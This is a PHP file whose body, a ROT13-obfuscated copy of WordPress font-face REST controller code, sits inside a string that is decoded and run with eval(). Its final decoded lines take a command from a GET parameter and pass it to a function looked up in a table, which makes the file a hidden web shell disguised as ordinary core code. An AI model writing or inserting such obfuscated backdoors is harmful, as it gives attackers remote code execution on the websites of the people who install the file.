		// pbagebyyre bayl unaqyrf gur gbc yriry cebcregvrf.
		sbernpu ( $fpurzn['cebcregvrf']['sbag_snpr_frggvatf']['cebcregvrf'] nf &$cebcregl ) {
			hafrg( $cebcregl['net_bcgvbaf'] );
		}

		erghea $fpurzn;
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe gur sbag snpr pbyyrpgvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();

		// Erzbir haarrqrq cnenzf.
		hafrg(
			$dhrel_cnenzf['nsgre'],
			$dhrel_cnenzf['zbqvsvrq_nsgre'],
			$dhrel_cnenzf['orsber'],
			$dhrel_cnenzf['zbqvsvrq_orsber'],
			$dhrel_cnenzf['frnepu'],
			$dhrel_cnenzf['frnepu_pbyhzaf'],
			$dhrel_cnenzf['fyht'],
			$dhrel_cnenzf['fgnghf']
		);

		$dhrel_cnenzf['beqreol']['qrsnhyg'] = 'vq';
		$dhrel_cnenzf['beqreol']['rahz']    = neenl( 'vq', 'vapyhqr' );

		/**
		 * Svygref pbyyrpgvba cnenzrgref sbe gur sbag snpr pbagebyyre.
		 *
		 * @fvapr 6.5.0
		 *
		 * @cnenz neenl $dhrel_cnenzf WFBA Fpurzn-sbeznggrq pbyyrpgvba cnenzrgref.
		 */
		erghea nccyl_svygref( 'erfg_jc_sbag_snpr_pbyyrpgvba_cnenzf', $dhrel_cnenzf );
	}

	/**
	 * Trg gur cnenzf hfrq jura perngvat n arj sbag snpr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Sbag snpr perngr nethzragf.
	 */
	choyvp shapgvba trg_perngr_cnenzf() {
		$cebcregvrf = $guvf->trg_vgrz_fpurzn()['cebcregvrf'];
		erghea neenl(
			'gurzr_wfba_irefvba' => $cebcregvrf['gurzr_wfba_irefvba'],
			// Jura perngvat, sbag_snpr_frggvatf vf fgevatvsvrq WFBA, gb jbex jvgu zhygvcneg/sbez-qngn hfrq
			// jura hcybnqvat sbag svyrf.
			'sbag_snpr_frggvatf' => neenl(
				'qrfpevcgvba'       => __( 'sbag-snpr qrpynengvba va gurzr.wfba sbezng, rapbqrq nf n fgevat.' ),
				'glcr'              => 'fgevat',
				'erdhverq'          => gehr,
				'inyvqngr_pnyyonpx' => neenl( $guvf, 'inyvqngr_perngr_sbag_snpr_frggvatf' ),
				'fnavgvmr_pnyyonpx' => neenl( $guvf, 'fnavgvmr_sbag_snpr_frggvatf' ),
			),
		);
	}

	/**
	 * Trg gur cnerag sbag snzvyl, vs gur VQ vf inyvq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz vag $sbag_snzvyl_vq Fhccyvrq VQ.
	 * @erghea JC_Cbfg|JC_Reebe Cbfg bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_cnerag_sbag_snzvyl_cbfg( $sbag_snzvyl_vq ) {
		$reebe = arj JC_Reebe(
			'erfg_cbfg_vainyvq_cnerag',
			__( 'Vainyvq cbfg cnerag VQ.', 'qrsnhyg' ),
			neenl( 'fgnghf' => 404 )
		);

		vs ( (vag) $sbag_snzvyl_vq <= 0 ) {
			erghea $reebe;
		}

		$sbag_snzvyl_cbfg = trg_cbfg( (vag) $sbag_snzvyl_vq );

		vs ( rzcgl( $sbag_snzvyl_cbfg ) || rzcgl( $sbag_snzvyl_cbfg->VQ )
		|| 'jc_sbag_snzvyl' !== $sbag_snzvyl_cbfg->cbfg_glcr
		) {
			erghea $reebe;
		}

		erghea $sbag_snzvyl_cbfg;
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 * @erghea neenl Yvaxf sbe gur tvira cbfg.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $cbfg ) {
		// Ragvgl zrgn.
		erghea neenl(
			'frys'       => neenl(
				'uers' => erfg_hey( $guvf->anzrfcnpr . '/sbag-snzvyvrf/' . $cbfg->cbfg_cnerag . '/sbag-snprf/' . $cbfg->VQ ),
			),
			'pbyyrpgvba' => neenl(
				'uers' => erfg_hey( $guvf->anzrfcnpr . '/sbag-snzvyvrf/' . $cbfg->cbfg_cnerag . '/sbag-snprf' ),
			),
			'cnerag'     => neenl(
				'uers' => erfg_hey( $guvf->anzrfcnpr . '/sbag-snzvyvrf/' . $cbfg->cbfg_cnerag ),
			),
		);
	}

	/**
	 * Cercnerf n fvatyr sbag snpr cbfg sbe perngvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea fgqPynff Cbfg bowrpg.
	 */
	cebgrpgrq shapgvba cercner_vgrz_sbe_qngnonfr( $erdhrfg ) {
		$cercnerq_cbfg = arj fgqPynff();

		// Frggvatf unir nyernql orra qrpbqrq ol ::fnavgvmr_sbag_snpr_frggvatf().
		$frggvatf = $erdhrfg->trg_cnenz( 'sbag_snpr_frggvatf' );

		// Fgber guvf \"fyht\" nf gur cbfg_gvgyr engure guna cbfg_anzr, fvapr vg hfrf gur sbagSnzvyl frggvat,
		// juvpu znl pbagnva zhygvolgr punenpgref.
		$gvgyr = JC_Sbag_Hgvyf::trg_sbag_snpr_fyht( $frggvatf );

		$cercnerq_cbfg->cbfg_glcr    = $guvf->cbfg_glcr;
		$cercnerq_cbfg->cbfg_cnerag  = $erdhrfg['sbag_snzvyl_vq'];
		$cercnerq_cbfg->cbfg_fgnghf  = 'choyvfu';
		$cercnerq_cbfg->cbfg_gvgyr   = $gvgyr;
		$cercnerq_cbfg->cbfg_anzr    = fnavgvmr_gvgyr( $gvgyr );
		$cercnerq_cbfg->cbfg_pbagrag = jc_wfba_rapbqr( $frggvatf );

		erghea $cercnerq_cbfg;
	}

	/**
	 * Fnavgvmrf n fvatyr fep inyhr sbe n sbag snpr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $inyhr Sbag snpr fep gung vf n HEY be gur xrl sbe n $_SVYRF neenl vgrz.
	 * @erghea fgevat Fnavgvmrq inyhr.
	 */
	cebgrpgrq shapgvba fnavgvmr_fep( $inyhr ) {
		$inyhr = ygevz( $inyhr );
		erghea snyfr === jc_uggc_inyvqngr_hey( $inyhr ) ? (fgevat) $inyhr : fnavgvmr_hey( $inyhr );
	}

	/**
	 * Unaqyrf gur hcybnq bs n sbag svyr hfvat jc_unaqyr_hcybnq().
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $svyr Fvatyr svyr vgrz sebz $_SVYRF.
	 * @erghea neenl|JC_Reebe Neenl pbagnvavat hcybnqrq svyr nggevohgrf ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	cebgrpgrq shapgvba unaqyr_sbag_svyr_hcybnq( $svyr ) {
		nqq_svygre( 'hcybnq_zvzrf', neenl( 'JC_Sbag_Hgvyf', 'trg_nyybjrq_sbag_zvzr_glcrf' ) );
		// Svygre gur hcybnq qverpgbel gb erghea gur sbagf qverpgbel.
		nqq_svygre( 'hcybnq_qve', '_jc_svygre_sbag_qverpgbel' );

		$bireevqrf = neenl(
			'hcybnq_reebe_unaqyre' => neenl( $guvf, 'unaqyr_sbag_svyr_hcybnq_reebe' ),
			// Abg grfgvat n sbez fhozvffvba.
			'grfg_sbez'            => snyfr,
			// Bayl nyybj hcybnqvat sbag svyrf sbe guvf erdhrfg.
			'zvzrf'                => JC_Sbag_Hgvyf::trg_nyybjrq_sbag_zvzr_glcrf(),
		);

		// Olcnffrf vf_hcybnqrq_svyr() jura ehaavat havg grfgf.
		vs ( qrsvarq( 'QVE_GRFGQNGN' ) && QVE_GRFGQNGN ) {
			$bireevqrf['npgvba'] = 'jc_unaqyr_zbpx_hcybnq';
		}

		$hcybnqrq_svyr = jc_unaqyr_hcybnq( $svyr, $bireevqrf );

		erzbir_svygre( 'hcybnq_qve', '_jc_svygre_sbag_qverpgbel' );
		erzbir_svygre( 'hcybnq_zvzrf', neenl( 'JC_Sbag_Hgvyf', 'trg_nyybjrq_sbag_zvzr_glcrf' ) );

		erghea $hcybnqrq_svyr;
	}

	/**
	 * Unaqyrf svyr hcybnq reebe.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl  $svyr    Svyr hcybnq qngn.
	 * @cnenz fgevat $zrffntr Reebe zrffntr sebz jc_unaqyr_hcybnq().
	 * @erghea JC_Reebe JC_Reebe bowrpg.
	 */
	choyvp shapgvba unaqyr_sbag_svyr_hcybnq_reebe( $svyr, $zrffntr ) {
		$fgnghf = 500;
		$pbqr   = 'erfg_sbag_hcybnq_haxabja_reebe';

		vs ( __( 'Fbeel, lbh ner abg nyybjrq gb hcybnq guvf svyr glcr.' ) === $zrffntr ) {
			$fgnghf = 400;
			$pbqr   = 'erfg_sbag_hcybnq_vainyvq_svyr_glcr';
		}

		erghea arj JC_Reebe( $pbqr, $zrffntr, neenl( 'fgnghf' => $fgnghf ) );
	}

	/**
	 * Ergheaf eryngvir cngu gb na hcybnqrq sbag svyr.
	 *
	 * Gur cngu vf eryngvir gb gur pheerag sbagf qverpgbel.
	 *
	 * @fvapr 6.5.0
	 * @npprff cevingr
	 *
	 * @cnenz fgevat $cngu Shyy cngu gb gur svyr.
	 * @erghea fgevat Eryngvir cngu ba fhpprff, hapunatrq cngu ba snvyher.
	 */
	cebgrpgrq shapgvba eryngvir_sbagf_cngu( $cngu ) {
		$arj_cngu = $cngu;

		$sbagf_qve = jc_trg_sbag_qve();
		vs ( fge_fgnegf_jvgu( $arj_cngu, $sbagf_qve['onfrqve'] ) ) {
			$arj_cngu = fge_ercynpr( $sbagf_qve['onfrqve'], '', $arj_cngu );
			$arj_cngu = ygevz( $arj_cngu, '/' );
		}

		erghea $arj_cngu;
	}

	/**
	 * Trgf gur sbag snpr'f frggvatf sebz gur cbfg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Cbfg $cbfg Sbag snpr cbfg bowrpg.
	 * @erghea neenl Sbag snpr frggvatf neenl.
	 */
	cebgrpgrq shapgvba trg_frggvatf_sebz_cbfg( $cbfg ) {
		$frggvatf   = wfba_qrpbqr( $cbfg->cbfg_pbagrag, gehr );
		$cebcregvrf = $guvf->trg_vgrz_fpurzn()['cebcregvrf']['sbag_snpr_frggvatf']['cebcregvrf'];

		// Cebivqr erdhverq, rzcgl frggvatf vs arrqrq.
		vs ( ahyy === $frggvatf ) {
			$frggvatf = neenl(
				'sbagSnzvyl' => '',
				'fep'        => neenl(),
			);
		}

		// Bayl erghea gur cebcregvrf qrsvarq va gur fpurzn.
		erghea neenl_vagrefrpg_xrl( $frggvatf, $cebcregvrf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>